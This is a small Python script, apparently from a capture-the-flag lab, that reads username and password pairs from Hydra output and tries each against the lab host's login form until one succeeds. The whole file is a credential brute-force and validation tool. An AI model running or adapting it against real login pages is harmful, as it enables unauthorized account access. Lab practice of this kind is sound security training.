import requests
import re

# URL del sito di login
url = "http://lms.permx.htb/index.php"

# File con i risultati di Hydra (username e password)
hydra_results_file = "hydra_results.txt"


# Funzione per testare il login con un'username e una password
def try_login(username, password):
    # Dati del form
    data = {"username": username, "password": password}

    # Effettua la richiesta POST per il login
    response = requests.post(url, data=data, allow_redirects=False)

    # Stampa di debug per vedere il codice di risposta e URL
    print(
        f"Trying {username}:{password}, Response Code: {response.status_code}, URL: {response.url}"
    )

    # Verifica se il login è fallito in base alla risposta
    if "loginFailed=1" in response.url:
        return False
    else:
        return True


# Funzione principale per leggere i risultati e provare i login
def main():
    # Pattern regex per estrarre login e password dalle righe di output di Hydra
    pattern = r"login: ([^\s]+)\s+password: ([^\s]+)"

    # Apri il file con i risultati di Hydra
    with open(hydra_results_file, "r") as file:
        for line in file:
            # Cerca login e password nella riga usando la regex
            match = re.search(pattern, line)
            if match:
                username = match.group(1)
                password = match.group(2)

                # Stampa di debug per vedere cosa è stato estratto
                print(f"Extracted -> Username: {username}, Password: {password}")

                # Prova il login con l'username e la password
                if try_login(username, password):
                    print(f"[SUCCESS] Login riuscito con: {username}:{password}")
                    return  # Ferma lo script una volta trovato un login valido
                else:
                    print(f"[FAILED] Login fallito con: {username}:{password}")
            else:
                print(
                    f"[ERROR] Impossibile estrarre login e password dalla riga: {line}"
                )


if __name__ == "__main__":
    main()
